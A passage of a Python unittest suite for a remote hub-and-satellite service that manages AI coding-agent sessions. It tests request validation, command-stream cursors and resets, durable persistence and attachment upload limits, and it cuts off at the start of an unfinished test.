                    b' "last_active_at": NaN}]}',
                    b'{"machine_id": "sat-m1", "rows": [{"key": "c:1",'
                    b' "last_active_at": -Infinity}]}',
                    b'{"machine_id": "sat-m1", "rows": [{"key": "c:1",'
                    b' "last_active_at": 1e400}]}'):
            status, _ = self._raw("POST", "/v1/agent/catalog", raw)
            self.assertEqual(status, 400, raw)
        status, _ = self._raw(
            "POST", "/v1/agent/catalog",
            b'{"machine_id": "sat-m1", "rows": [{"key": "c:1",'
            b' "last_active_at": 1.5e9}]}')
        self.assertEqual(status, 200)

    def test_an_event_whose_data_is_not_an_object_is_skipped(self):
        status, data = self.srv.request(
            "POST", "/v1/agent/events",
            {"machine_id": self.mid, "events": [
                {"type": "approval.requested", "session": "claude:r1",
                 "data": [1]},
                {"type": "session.launched", "data": "x"},
                protocol.event(
                    "message.appended", "claude:r1", self.mid,
                    protocol.message("user", "still lands")),
            ]},
            headers=self.srv.sat_auth)
        self.assertEqual(status, 200, data)
        events, _ = self.srv.state.journal.read_since(
            "claude:r1@sat-m1", 0)
        self.assertEqual([e["type"] for e in events],
                         ["message.appended"])

    def test_catalog_bad_body_and_missing_mid(self):
        status, _ = self._raw("POST", "/v1/agent/catalog", b"{bad")
        self.assertEqual(status, 400)
        status, _ = self.srv.request(
            "POST", "/v1/agent/catalog", {"rows": []},
            headers=self.srv.sat_auth)
        self.assertEqual(status, 422)

    def test_events_bad_body_and_non_list(self):
        status, _ = self._raw("POST", "/v1/agent/events", b"{bad")
        self.assertEqual(status, 400)
        status, _ = self.srv.request(
            "POST", "/v1/agent/events",
            {"machine_id": self.mid, "events": "x"},
            headers=self.srv.sat_auth)
        self.assertEqual(status, 422)
        # Events that aren't dicts are skipped, not fatal. A notify
        # event with no kind is dropped too — kinds are vetted.
        status, data = self.srv.request(
            "POST", "/v1/agent/events",
            {"machine_id": self.mid, "events": [
                42, {"type": "notify", "data": {"kind": "finished"}},
                {"type": "notify"},
            ]},
            headers=self.srv.sat_auth)
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(data)["accepted"], 1)

    def test_forward_bad_command_bodies(self):
        self.srv.request(
            "POST", "/v1/agent/catalog",
            {"machine_id": self.mid, "rows": [
                {"key": "claude:r1", "ownership": "attached",
                 "status": "idle"}]},
            headers=self.srv.sat_auth)
        self.srv.state.catalog.refresh()
        key = "claude%3Ar1%40sat-m1"
        status, _ = self.srv.request(
            "POST", f"/v1/sessions/{key}/message", {"text": ""},
            headers=self.srv.auth)
        self.assertEqual(status, 422)
        status, _ = self.srv.request(
            "POST", f"/v1/sessions/{key}/approval",
            {"decision": "allow"},  # no request_id
            headers=self.srv.auth)
        self.assertEqual(status, 422)
        status, _ = self.srv.request(
            "POST", f"/v1/sessions/{key}/control", {"op": "bogus"},
            headers=self.srv.auth)
        self.assertEqual(status, 422)
        status, _ = self.srv.request(
            "POST", f"/v1/sessions/{key}/nonsense", {},
            headers=self.srv.auth)
        self.assertEqual(status, 404)

    def test_satellite_queue_send_never_says_waiting(self):
        # The row says mid-turn, but the hub holds nothing to act on,
        # so a client must not park the send in its tray.
        self.srv.request(
            "POST", "/v1/agent/catalog",
            {"machine_id": self.mid, "rows": [
                {"key": "claude:r1", "ownership": "attached",
                 "status": "active"}]},
            headers=self.srv.sat_auth)
        self.srv.state.catalog.refresh()
        status, data = self.srv.request(
            "POST", "/v1/sessions/claude%3Ar1%40sat-m1/message",
            {"text": "later", "mode": "queue", "client_id": "q-9"},
            headers=self.srv.auth)
        self.assertEqual(status, 202)
        self.assertFalse(json.loads(data)["waiting"])

    def test_satellite_queue_tray_is_empty_and_actions_409(self):
        # A satellite waits for idle on its own machine, so nothing
        # waits on the hub: the list is empty and an action says why.
        self.srv.request(
            "POST", "/v1/agent/catalog",
            {"machine_id": self.mid, "rows": [
                {"key": "claude:r1", "ownership": "attached",
                 "status": "active"}]},
            headers=self.srv.sat_auth)
        self.srv.state.catalog.refresh()
        key = "claude%3Ar1%40sat-m1"
        status, data = self.srv.request(
            "GET", f"/v1/sessions/{key}/queue", headers=self.srv.auth)
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(data), {"sends": []})
        for body in ({"client_id": "q-1", "op": "cancel"},
                     {"client_id": "q-1", "op": "edit", "text": "new"}):
            status, data = self.srv.request(
                "POST", f"/v1/sessions/{key}/queue", body,
                headers=self.srv.auth)
            self.assertEqual(status, 409, body)
            self.assertEqual(
                json.loads(data)["error"]["code"], "queue_unsupported")
        replay, _ = self.srv.state.journal.read_since("_sat_sat-m1", 0)
        self.assertEqual(replay, [])

    def test_forward_control_on_observed_is_409(self):
        self.srv.request(
            "POST", "/v1/agent/catalog",
            {"machine_id": self.mid, "rows": [
                {"key": "claude:r1", "ownership": "observed"}]},
            headers=self.srv.sat_auth)
        self.srv.state.catalog.refresh()
        status, _ = self.srv.request(
            "POST", "/v1/sessions/claude%3Ar1%40sat-m1/control",
            {"op": "interrupt"}, headers=self.srv.auth)
        self.assertEqual(status, 409)

    def test_launch_to_offline_registered_machine_queues(self):
        # A registered machine that is offline still gets the command —
        # the offline queue is the point. Only a never-registered id
        # is refused (test_launch_to_unknown_machine_is_404).
        catalog_mod.upsert_machine(self.srv.home, {"id": "ghost"})
        status, data = self.srv.request(
            "POST", "/v1/sessions",
            {"machine": "ghost", "harness": "claude", "cwd": "/x",
             "prompt": "go"},
            headers=self.srv.auth)
        self.assertEqual(status, 202, data)
        replay, _ = self.srv.state.journal.read_since("_sat_ghost", 0)
        self.assertEqual(replay[0]["data"]["op"], "launch")


class TestAgentCommand(unittest.TestCase):
    """commands._cmd_agent: pairing flags, missing conf, serve call.

    Each test gets its own HOME: ``_cmd_agent`` takes the one-agent lock
    and writes ``machine.json`` under ``~/.swe/data/remote``, which was
    the HOME the whole suite shares, so another test (or a running agent)
    holding that lock changed the answer.
    """

    def setUp(self):
        self.home = temp_dir(self)
        self.enterContext(patch.dict(os.environ, {"HOME": str(self.home)}))

    def _run(self, flags):
        from swe.remote import commands
        with patch("sys.stdout", __import__("io").StringIO()) as out, \
             patch("sys.stderr", __import__("io").StringIO()) as err:
            rc = commands._cmd_agent(flags)
        return rc, out.getvalue(), err.getvalue()

    def test_token_without_hub(self):
        rc, _o, err = self._run({"--token": "t"})
        self.assertEqual(rc, 1)
        self.assertIn("--hub", err)

    def test_pair_failure(self):
        with patch.object(agent_mod, "pair_agent", return_value=None):
            rc, _o, err = self._run(
                {"--token": "t", "--hub": "http://h:1"})
        self.assertEqual(rc, 1)
        self.assertIn("pairing failed", err)

    def test_no_conf(self):
        with patch.object(agent_mod, "load_agent", return_value=None):
            rc, _o, err = self._run({})
        self.assertEqual(rc, 1)
        self.assertIn("no hub credential", err)

    def test_paired_then_serve(self):
        conf = {"hub": "http://h:1", "credential": "c", "device_id": "d"}
        with patch.object(agent_mod, "pair_agent", return_value=conf), \
             patch.object(agent_mod, "serve", return_value=0) as srv:
            rc, out, _ = self._run(
                {"--token": "t", "--hub": "http://h:1", "--name": "mbp"})
        self.assertEqual(rc, 0)
        self.assertIn("paired", out)
        srv.assert_called_once_with("http://h:1", "c")

    def test_hub_flag_rewrites_saved_conf(self):
        conf = {"hub": "http://old:1", "credential": "c"}
        with patch.object(agent_mod, "load_agent", return_value=conf), \
             patch.object(agent_mod, "serve", return_value=0) as srv:
            rc, _o, _e = self._run({"--hub": "http://new:2"})
        self.assertEqual(rc, 0)
        srv.assert_called_once_with("http://new:2", "c")
        from swe.paths import remote_dir_for
        remote = remote_dir_for(self.home)
        self.assertTrue((remote / agent_mod.LOCK_FILE).exists())
        self.assertTrue((remote / "machine.json").exists())


class TestAgentLoopEdges(unittest.TestCase):
    """agent.py: stream loop, run(), save-cursor failure."""

    def setUp(self):
        self.home = temp_dir(self)

    def _agent(self):
        return agent_mod.RemoteAgent("http://h:1", "cred", self.home)

    def test_save_cmd_cursor_oserror(self):
        ag = self._agent()
        ag._done_cmd_seq = 9
        with patch.object(agent_mod, "atomic_write_text",
                          side_effect=OSError):
            ag._save_cmd_cursor()  # must not raise
            ag._save_outbox_ack()

    def test_cursor_and_ack_are_written_atomically(self):
        # A plain write_text torn by a crash read back as no cursor
        # (the backlog re-ran) or ack 0 (the outbox was resent).
        ag = self._agent()
        ag._done_cmd_seq, ag._outbox_ack = 3, 4
        real = agent_mod.atomic_write_text
        with patch.object(agent_mod, "atomic_write_text",
                          side_effect=real) as write:
            ag._save_cmd_cursor()
            ag._save_outbox_ack()
        self.assertEqual([c[0][0] for c in write.call_args_list],
                         [ag._cmd_cursor_file(), ag._outbox_ack_file()])
        b = self._agent()
        self.assertEqual((b._done_cmd_seq, b._outbox_ack), (3, 4))

    def test_command_stream_reads_frames(self):
        ag = self._agent()
        handled = []

        def stop_after(blob):
            handled.append(blob)
            ag._stop.set()

        ag._handle_frame = stop_after
        frame = json.dumps({"type": "command", "seq": 1,
                            "data": {"op": "x"}}).encode()
        resp = MagicMock()
        resp.__iter__.return_value = iter(
            [b"data: " + frame + b"\n", b"\n"])
        resp.__enter__.return_value = resp
        with patch("urllib.request.urlopen", return_value=resp):
            ag._command_stream()
        self.assertEqual(len(handled), 1)

    def test_command_stream_network_error_retries(self):
        ag = self._agent()
        calls = []

        def boom(req, timeout=None):
            calls.append(1)
            ag._stop.set()
            raise OSError("down")

        with patch("urllib.request.urlopen", boom), \
             patch.object(agent_mod.time, "sleep"):
            ag._command_stream()
        self.assertEqual(calls, [1])

    def test_run_spawns_and_joins_threads(self):
        ag = self._agent()
        ag._register = MagicMock()
        ag._push_catalog = MagicMock(return_value=True)
        # Loop bodies only mark that they ran; run() then waits on _stop.
        # _usage_loop too: its push reads real provider quotas.
        loops = ("_uplink_loop", "_delta_loop", "_catalog_loop",
                 "_usage_loop", "_tail_loop", "_downlink_loop")
        ran = {name: threading.Event() for name in loops}
        for name in loops:
            setattr(ag, name, ran[name].set)
        result = []
        t = threading.Thread(target=lambda: result.append(ag.run()),
                             daemon=True)
        # Stop and join even when an assert below fails, so a broken run()
        # does not leave its thread behind for the rest of the suite.
        self.addCleanup(t.join, 5)
        self.addCleanup(ag._stop.set)
        t.start()
        for name in loops:
            self.assertTrue(ran[name].wait(5), f"{name} never started")
        ag._stop.set()
        t.join(timeout=5)
        self.assertFalse(t.is_alive())
        self.assertEqual(result, [0])
        ag._register.assert_called_once_with()
        ag._push_catalog.assert_called_once_with()

    def test_serve_builds_and_runs(self):
        fake = MagicMock()
        fake.run.return_value = 0
        with patch.object(agent_mod, "RemoteAgent", return_value=fake) as cls:
            self.assertEqual(agent_mod.serve("http://h", "c"), 0)
        cls.assert_called_once_with("http://h", "c", None)
        fake.run.assert_called_once_with()


class TestCatalogEdge(unittest.TestCase):
    def setUp(self):
        self.home = temp_dir(self)

    def test_lookups_use_the_index_built_with_the_rows(self):
        sessions = [_session(f"s{i}") for i in range(300)]
        cat = catalog_mod.Catalog(self.home, "m1",
                                  fetch_sessions=lambda: sessions,
                                  status_of=lambda ss: [""] * len(ss),
                                  model_of=lambda ss: [""] * len(ss))
        cat.refresh()
        self.assertIs(cat.session_for("claude:s299"), sessions[299])
        self.assertEqual(cat.row_for("claude:s7")["key"], "claude:s7")
        self.assertIsNone(cat.row_for("claude:nope"))
        cat.note_status("claude:s5", "active", time.time() + 60)
        self.assertEqual(cat.row_for("claude:s5")["status"], "active")
        self.assertEqual(catalog_mod._index_of([("a", 0), ("b", 1), ("a", 2)]),
                         {"a": 0, "b": 1})


    def test_machine_ids_that_map_alike_get_their_own_files(self):
        # "m.1" and "m_1" both became m_1.json: one satellite's rows
        # overwrote the other's.
        self.assertNotEqual(catalog_mod._safe_mid("m.1"),
                            catalog_mod._safe_mid("m_1"))
        self.assertEqual(catalog_mod._safe_mid("c92d6398"), "c92d6398")
        catalog_mod.merge_remote_rows(self.home, "m.1", [{"key": "claude:a"}])
        catalog_mod.merge_remote_rows(self.home, "m_1", [{"key": "claude:b"}])
        keys = sorted(r["key"] for r in catalog_mod.load_remote_rows(self.home))
        self.assertEqual(keys, ["claude:a@m.1", "claude:b@m_1"])

    def test_a_pre_suffix_file_is_read_until_superseded_and_never_deleted(self):
        folder = catalog_mod._satellite_dir(self.home)
        folder.mkdir(parents=True)
        (folder / "m_1.json").write_text(json.dumps(
            {"rows": [{"key": "claude:old@m.1", "machine_id": "m.1"}]}))
        self.assertEqual([r["key"] for r in catalog_mod.load_remote_rows(self.home)],
                         ["claude:old@m.1"])
        catalog_mod.merge_remote_rows(self.home, "m.1", [{"key": "claude:a"}])
        self.assertEqual([r["key"] for r in catalog_mod.load_remote_rows(self.home)],
                         ["claude:a@m.1"])
        # Either write order: "m_1"'s own file is its own, never removed.
        catalog_mod.merge_remote_rows(self.home, "m_1", [{"key": "claude:b"}])
        catalog_mod.merge_remote_rows(self.home, "m.1", [{"key": "claude:a"}])
        keys = sorted(r["key"] for r in catalog_mod.load_remote_rows(self.home))
        self.assertEqual(keys, ["claude:a@m.1", "claude:b@m_1"])

    def test_a_menu_saved_under_the_old_name_still_loads(self):
        from swe.remote import slash
        path = slash._sat_file(self.home, "m.1").with_name("m_1.json")
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps({"harnesses": {}}))
        self.assertEqual(slash.load_satellite(self.home, "m.1"), {"harnesses": {}})

    def test_merge_skips_non_dict_rows(self):
        out = catalog_mod.merge_remote_rows(
            self.home, "m1", ["bad", {"key": "claude:r1"}])
        self.assertEqual(len(out), 1)
        self.assertEqual(out[0]["key"], "claude:r1@m1")

    def test_merge_write_failure_tolerated(self):
        with patch.object(
            catalog_mod, "atomic_write_text", side_effect=OSError):
            out = catalog_mod.merge_remote_rows(
                self.home, "m1", [{"key": "claude:r1"}])
        self.assertEqual(len(out), 1)  # rows still returned

    def test_load_remote_rows_skips_corrupt(self):
        base = catalog_mod._satellite_dir(self.home)
        base.mkdir(parents=True)
        (base / "m1.json").write_text("{bad")
        (base / "m2.json").write_text(
            json.dumps({"rows": [{"key": "claude:r1@m2"}, "x"]}))
        rows = catalog_mod.load_remote_rows(self.home)
        self.assertEqual(rows, [{"key": "claude:r1@m2"}])


class TestUploadRouteEdges(unittest.TestCase):
    """hub.py upload/attachment-fetch error branches."""

    def setUp(self):
        self.srv = _AgentHub()
        self.addCleanup(self.srv.stop)
        # A satellite row so the remote attachments route engages.
        self.srv.request(
            "POST", "/v1/agent/catalog",
            {"machine_id": "sat-m1", "rows": [
                {"key": "claude:r1", "ownership": "attached"}]},
            headers=self.srv.sat_auth)
        self.srv.state.catalog.refresh()

    def test_empty_upload_400(self):
        conn = http.client.HTTPConnection("127.0.0.1", self.srv.port,
                                          timeout=5)
        conn.request(
            "POST", "/v1/sessions/claude%3Ar1%40sat-m1/attachments?name=x.png",
            body=b"", headers={**self.srv.auth,
                               "Content-Type": "application/octet-stream"})
        resp = conn.getresponse()
        resp.read()
        conn.close()
        self.assertEqual(resp.status, 400)

    def test_too_large_413(self):
        conn = http.client.HTTPConnection("127.0.0.1", self.srv.port,
                                          timeout=5)
        with patch.object(attachments, "MAX_BYTES", 4):
            conn.request(
                "POST",
                "/v1/sessions/claude%3Ar1%40sat-m1/attachments?name=x.png",
                body=b"12345",
                headers={**self.srv.auth,
                         "Content-Type": "application/octet-stream"})
            resp = conn.getresponse()
            resp.read()
            conn.close()
        self.assertEqual(resp.status, 413)

    def test_pull_attachment_unreadable(self):
        # Stage on the hub key, then delete the file: read fails → 404.
        payload, err = attachments.stage(
            self.srv.home, "claude:k@sat-m1", "x.png", b"PNG")
        self.assertIsNone(err)
        Path(payload["path"]).unlink()
        conn = http.client.HTTPConnection("127.0.0.1", self.srv.port,
                                          timeout=5)
        conn.request(
            "GET",
            f"/v1/agent/attachments/claude%3Ak%40sat-m1/{payload['ref']}",
            headers=self.srv.sat_auth)
        resp = conn.getresponse()
        resp.read()
        conn.close()
        self.assertEqual(resp.status, 404)


class TestAgentCmdDispatch(unittest.TestCase):
    def test_agent_subcommand_rejects_extra_args(self):
        from swe.remote import commands
        with patch("sys.stderr", __import__("io").StringIO()) as err:
            rc = commands.cmd_remote(["agent", "extra"])
        self.assertEqual(rc, 1)
        self.assertIn("unexpected", err.getvalue())


class TestR3FinalEdges(unittest.TestCase):
    """Tail of the diff: loop bodies, read failures, upload variants."""

    def setUp(self):
        self.home = temp_dir(self)

    def test_stream_sleep_between_reconnects(self):
        ag = agent_mod.RemoteAgent("http://h:1", "c", self.home)
        resp = MagicMock()
        resp.__iter__.return_value = iter([b"data: {}\n", b"\n"])
        resp.__enter__.return_value = resp

        sleeps = []

        def sleepy(s):
            sleeps.append(s)
            ag._stop.set()

        with patch("urllib.request.urlopen", return_value=resp) as urlopen, \
             patch.object(agent_mod.time, "sleep", sleepy):
            ag._command_stream()
        # The stream ran to its end, then paused one second before the
        # caller reconnects.
        self.assertEqual(sleeps, [1])
        self.assertEqual(
            urlopen.call_args[0][0].full_url,
            f"http://h:1/v1/agent/commands?machine={ag.machine_id}&last=0")

    def test_loop_bodies_run_once(self):
        ag = agent_mod.RemoteAgent("http://h:1", "c", self.home)
        calls = []

        def once(name, stop=True):
            def body(*_a, **_kw):
                calls.append(name)
                if stop:
                    ag._stop.set()
            return body

        ag._push_events = once("push_events")
        ag._uplink_loop()
        self.assertEqual(calls, ["push_events"])
        ag._stop.clear()
        calls.clear()
        ag._push_catalog = once("push_catalog", stop=False)
        ag.tail_manager.sync = once("sync")
        ag._catalog_loop()
        self.assertEqual(calls, ["push_catalog", "sync"])
        ag._stop.clear()
        calls.clear()
        ag.tail_manager.tick = once("tick")
        ag._tail_loop()
        self.assertEqual(calls, ["tick"])
        ag._stop.clear()
        calls.clear()

        def boom():
            calls.append("command_stream")
            ag._stop.set()
            raise OSError("x")

        # Stubbed: the real register would dial the fake hub host.
        ag._register = once("register", stop=False)
        ag._command_stream = boom
        with patch.object(agent_mod, "RECONNECT_S", 0):
            ag._downlink_loop()
        # Every reconnect registers first, and a raising stream ends the
        # pass instead of escaping the loop.
        self.assertEqual(calls, ["register", "command_stream"])

    def test_tail_loop_sweeps_keeping_the_outbox(self):
        ag = agent_mod.RemoteAgent("http://h:1", "c", self.home)
        calls = []

        def sweep(journal, keep=(), now=None):
            calls.append((journal, tuple(keep)))
            ag._stop.set()
            return 0

        ag.tail_manager.tick = lambda: None
        ag.tail_manager.wait = lambda _t: None
        swept = []
        with patch.object(ag.tail_manager, "sweep_stale", sweep), \
             patch.object(attachments, "sweep", side_effect=swept.append):
            ag._tail_loop()
        # This machine's own stream stays too (the loopback API reads
        # it), with the journal of every session a keeper holds here.
        self.assertEqual(calls, [(ag._outbox, (agent_mod.OUTBOX_KEY,
                                               hub.GLOBAL_KEY))])
        # Staged attachments age out here too, as on the hub.
        self.assertEqual(swept, [self.home])

    def test_load_remote_rows_glob_failure(self):
        with patch.object(Path, "glob", side_effect=OSError):
            self.assertEqual(catalog_mod.load_remote_rows(self.home), [])

    def test_message_op_resolves_attachment(self):
        ag = agent_mod.RemoteAgent("http://h:1", "c", self.home)
        sess = _session()
        ag.catalog.session_for = lambda k: sess
        payload, err = attachments.stage(self.home, "k", "a.png", b"PNG")
        self.assertIsNone(err)
        fake = MagicMock()
        fake.send.return_value = inject.InjectResult(True, "ok")
        with patch.object(supervise, "meta_for", return_value={}), \
             patch.object(inject, "injector_for", return_value=fake):
            ok, _, _deg = ag._execute(
                "k", "message",
                {"text": "hi", "attachments": [payload["ref"]]})
        self.assertTrue(ok)
        sent = fake.send.call_args[0][1]
        # resolve() returns the realpath form of the staged file.
        self.assertTrue(
            sent["attachments"][0].endswith(payload["ref"]))


class TestUploadVariants(unittest.TestCase):
    def setUp(self):
        self.srv = _AgentHub()
        self.addCleanup(self.srv.stop)
        self.srv.request(
            "POST", "/v1/agent/catalog",
            {"machine_id": "sat-m1", "rows": [
                {"key": "claude:r1", "ownership": "attached"}]},
            headers=self.srv.sat_auth)
        self.srv.state.catalog.refresh()

    def _post_raw(self, path, data, ctype):
        conn = http.client.HTTPConnection("127.0.0.1", self.srv.port,
                                          timeout=5)
        conn.request("POST", path, body=data,
                     headers={**self.srv.auth, "Content-Type": ctype})
        resp = conn.getresponse()
        body = resp.read()
        conn.close()
        return resp.status, body

    def test_stage_bad_extension_422(self):
        status, _ = self._post_raw(
            "/v1/sessions/claude%3Ar1%40sat-m1/attachments?name=x.exe",
            b"MZ", "application/octet-stream")
        self.assertEqual(status, 422)

    def test_multipart_unparseable_400(self):
        status, _ = self._post_raw(
            "/v1/sessions/claude%3Ar1%40sat-m1/attachments",
            b"garbage", "multipart/form-data; boundary=NOPE")
        self.assertEqual(status, 400)

    def test_pull_attachment_read_failure(self):
        payload, err = attachments.stage(
            self.srv.home, "claude:k@sat-m1", "x.png", b"PNG")
        self.assertIsNone(err)
        with patch.object(Path, "read_bytes", side_effect=OSError):
            conn = http.client.HTTPConnection("127.0.0.1",
                                              self.srv.port, timeout=5)
            conn.request(
                "GET",
                f"/v1/agent/attachments/claude%3Ak%40sat-m1/{payload['ref']}",
                headers=self.srv.sat_auth)
            resp = conn.getresponse()
            resp.read()
            conn.close()
        self.assertEqual(resp.status, 404)

    def test_agent_dispatch(self):
        from swe.remote import commands
        with patch.object(commands, "_cmd_agent", return_value=0) as ca:
            self.assertEqual(commands.cmd_remote(["agent"]), 0)
        ca.assert_called_once()


class TestReviewFixes(unittest.TestCase):
    """Coverage for the R3 review fixes: cursor semantics, durability,
    dispatch threading, backlog cap, path safety, tail op."""

    def setUp(self):
        self.home = temp_dir(self)

    def _agent(self):
        return agent_mod.RemoteAgent("http://h:1", "cred", self.home)

    def test_message_op_goes_to_worker(self):
        ag = self._agent()
        ag._dispatch = MagicMock()
        ag._sendq = MagicMock()
        ag._handle_frame(json.dumps({
            "type": "command", "seq": 1, "session": "claude:a",
            "data": {"op": "message", "command_id": "c1"},
        }).encode())
        ag._dispatch.assert_not_called()
        key, run, _cancel = ag._sendq.submit.call_args[0]
        # No mode means queue: its own lane, beside the session's.
        self.assertEqual(key, "claude:a\x00queue")
        run()
        ag._dispatch.assert_called_once()
        self.assertEqual(ag._done_cmd_seq, 1)
        ag._dispatch.reset_mock()
        # Control ops still run inline.
        ag._handle_frame(json.dumps({
            "type": "command", "seq": 2,
            "data": {"op": "control", "command_id": "c2"},
        }).encode())
        ag._dispatch.assert_called_once()

    def _frame(self, **ev):
        return json.dumps(ev).encode()

    def test_cursor_follows_a_wiped_command_journal(self):
        # The hub's _sat_ journal started over below our cursor: it says
        # so with journal.truncated at its head. Without acting on it,
        # every new command (seq 1, 2, ...) was dropped as already seen.
        ag = self._agent()
        ag._done_cmd_seq = ag._last_cmd_seq = ag._stream_cursor = 50
        ag._done_set = {52}
        ag._dispatch = MagicMock()
        self.assertEqual(ag._handle_frame(
            self._frame(type="journal.truncated", seq=2)), "reset")
        # Back to 0, so the reconnect replays the commands the new
        # journal queued while we were away (seq 1 and 2) too.
        self.assertEqual((ag._done_cmd_seq, ag._last_cmd_seq), (0, 0))
        self.assertEqual(ag._done_set, set())
        self.assertEqual(self._agent()._done_cmd_seq, 0)  # persisted
        for seq in (1, 2, 3):
            ag._handle_frame(self._frame(
                type="command", seq=seq, data={"op": "control"}))
        self.assertEqual(ag._dispatch.call_count, 3)
        self.assertEqual(ag._done_cmd_seq, 3)

    def test_truncated_at_our_own_cursor_changes_nothing(self):
        # Behind the ring the hub echoes the cursor we sent, even when
        # a command finished meanwhile and moved the floor past it.
        ag = self._agent()
        ag._done_cmd_seq, ag._last_cmd_seq = 5, 7
        ag._stream_cursor = 5
        ag._mark_done(6)
        self.assertEqual(ag._done_cmd_seq, 6)
        self.assertIsNone(ag._handle_frame(
            self._frame(type="journal.truncated", seq=5)))
        self.assertEqual((ag._done_cmd_seq, ag._last_cmd_seq), (6, 7))

    def test_command_from_before_a_reset_cannot_mark_a_new_one_done(self):
        # A message queued under the old journal finishes after the
        # reset: its seq must not count as done in the new journal.
        ag = self._agent()
        ag._done_cmd_seq = ag._last_cmd_seq = ag._stream_cursor = 9
        ag._dispatch = MagicMock()
        ag._sendq = MagicMock()
        ag._handle_frame(self._frame(
            type="command", seq=10, session="claude:a",
            data={"op": "message"}))
        _key, run, _cancel = ag._sendq.submit.call_args[0]
        ag._handle_frame(self._frame(type="journal.truncated", seq=0))
        run()  # the old seq 10 finishes now
        self.assertEqual(ag._done_cmd_seq, 0)
        self.assertNotIn(10, ag._done_set)

    def test_command_stream_reconnects_after_a_reset(self):
        # The stream drops after a reset so the next connection's
        # ?last= (the hub's backlog floor) is the new cursor.
        ag = self._agent()
        ag._done_cmd_seq = ag._last_cmd_seq = 50
        ag._dispatch = MagicMock()
        frames = [self._frame(type="journal.truncated", seq=0),
                  self._frame(type="command", seq=1, data={"op": "x"})]
        resp = MagicMock()
        resp.__iter__.return_value = iter(
            [line for f in frames for line in (b"data: " + f + b"\n", b"\n")])
        resp.__enter__.return_value = resp
        with patch("urllib.request.urlopen", return_value=resp), \
             patch.object(agent_mod.time, "sleep"):
            ag._command_stream()
        ag._dispatch.assert_not_called()
        self.assertEqual(ag._done_cmd_seq, 0)

    def test_slow_ops_leave_the_stream_thread(self):
        # A launch boots a pane (up to 30 s) and an attachment pull
        # downloads; inline, every command behind them waited.
        ag = self._agent()
        ran = []
        ag._dispatch = lambda ev: ran.append(ev["data"]["op"])
        ag._sendq = MagicMock()
        threads = []
        with patch.object(agent_mod.threading, "Thread") as thread:
            thread.side_effect = lambda **kw: threads.append(kw) or MagicMock()
            for seq, op in enumerate(("launch", "attachment", "message"), 1):
                ag._handle_frame(json.dumps({
                    "type": "command", "seq": seq, "session": "claude:a",
                    "data": {"op": op}}).encode())
        self.assertEqual(ran, [])  # nothing ran on the stream thread
        self.assertEqual(len(threads), 1)  # launch: its own thread
        threads[0]["target"](*threads[0]["args"])
        queued = ag._sendq.submit.call_args_list
        # The pull keeps the session's lane; a queue-mode send waits on
        # its own.
        self.assertEqual([c[0][0] for c in queued],
                         ["claude:a", "claude:a\x00queue"])
        for c in queued:
            c[0][1]()  # the session queue runs them in submit order
        self.assertEqual(ran, ["launch", "attachment", "message"])
        self.assertEqual(ag._done_cmd_seq, 3)

    def test_attach_stays_on_the_stream(self):
        # Queued behind a headless turn, an attach could run after a
        # later detach and undo it.
        ag = self._agent()
        ag._dispatch = MagicMock()
        ag._sendq = MagicMock()
        ag._handle_frame(json.dumps({
            "type": "command", "seq": 1, "session": "claude:a",
            "data": {"op": "attach"}}).encode())
        ag._dispatch.assert_called_once()
        ag._sendq.submit.assert_not_called()

    def test_one_sessions_turn_does_not_hold_another(self):
        # A headless send blocks for its whole turn; a message to a
        # second session used to wait behind it on the single worker.
        ag = self._agent()
        release = threading.Event()
        ran = []
        second = threading.Event()

        def dispatch(ev):
            ran.append(ev["seq"])
            if ev["seq"] == 1:
                release.wait(30)  # held until the assertion is done
            else:
                second.set()

        ag._dispatch = dispatch
        try:
            for seq, key in ((1, "claude:a"), (2, "claude:b")):
                ag._handle_frame(json.dumps({
                    "type": "command", "seq": seq, "session": key,
                    "data": {"op": "message"}}).encode())
            self.assertTrue(second.wait(5))
        finally:
            release.set()
            ag._sendq.close()

    def test_a_raising_send_does_not_stop_the_queue(self):
        ag = self._agent()
        done = threading.Event()

        def dispatch(ev):
            if ev["seq"] == 1:
                raise RuntimeError("boom")
            done.set()

        ag._dispatch = dispatch
        for seq in (1, 2):
            ag._handle_frame(json.dumps({
                "type": "command", "seq": seq, "session": "claude:a",
                "data": {"op": "message"}}).encode())
        self.assertTrue(done.wait(5))
        ag._sendq.close()

    def test_done_cursor_contiguous(self):
        ag = self._agent()
        ag._done_cmd_seq = 0
        ag._mark_done(2)
        self.assertEqual(ag._done_cmd_seq, 0)   # seq 1 unfinished
        ag._mark_done(1)
        self.assertEqual(ag._done_cmd_seq, 2)   # contiguous advance
        ag._mark_done(4)
        ag._mark_done(3)
        self.assertEqual(ag._done_cmd_seq, 4)

    def test_done_cursor_persists_as_json(self):
        ag = self._agent()
        ag._done_cmd_seq = 7
        ag._save_cmd_cursor()
        data = json.loads(ag._cmd_cursor_file().read_text())
        self.assertEqual(data, {"hub": "http://h:1", "seq": 7,
                                "done": []})

    def test_done_set_persists_across_restart(self):
        ag = self._agent()
        for s in (1, 2, 3, 4):
            ag._mark_done(s)
        # seq 5 (a long headless send) still runs when seq 6 finishes:
        # the floor holds at 4 and 6 lands in the done set.
        ag._mark_done(6)
        self.assertEqual(ag._done_cmd_seq, 4)
        self.assertEqual(ag._done_set, {6})
        data = json.loads(ag._cmd_cursor_file().read_text())
        self.assertEqual(data["done"], [6])
        b = self._agent()
        self.assertEqual(b._done_cmd_seq, 4)
        self.assertEqual(b._done_set, {6})

    def test_done_set_scoped_to_hub(self):
        ag = self._agent()
        ag._mark_done(2)
        other = agent_mod.RemoteAgent("http://other:9", "c", self.home)
        self.assertEqual(other._done_cmd_seq, 0)
        self.assertEqual(other._done_set, set())

    def test_replayed_done_seq_is_not_run_twice(self):
        ag = self._agent()
        for s in (1, 2, 3, 4):
            ag._mark_done(s)
        ag._mark_done(6)  # seq 5 still running; 6 is done above floor
        b = self._agent()  # restarted: resumes the stream at ?last=4
        b._dispatch = MagicMock()
        b._sendq = MagicMock()
        # seq 5's message op parks on the work queue — not done yet.
        b._handle_frame(json.dumps({
            "type": "command", "seq": 5,
            "data": {"op": "message", "command_id": "c5"}}).encode())
        b._handle_frame(json.dumps({
            "type": "command", "seq": 6,
            "data": {"op": "control", "command_id": "c6"}}).encode())
        b._dispatch.assert_not_called()   # 5 waits on _sendq, 6 skipped
        b._sendq.submit.assert_called_once()
        self.assertEqual(b._last_cmd_seq, 6)  # wire cursor still moved
        self.assertEqual(b._done_cmd_seq, 4)  # floor waits on seq 5

    def test_outbox_durable_across_restart(self):
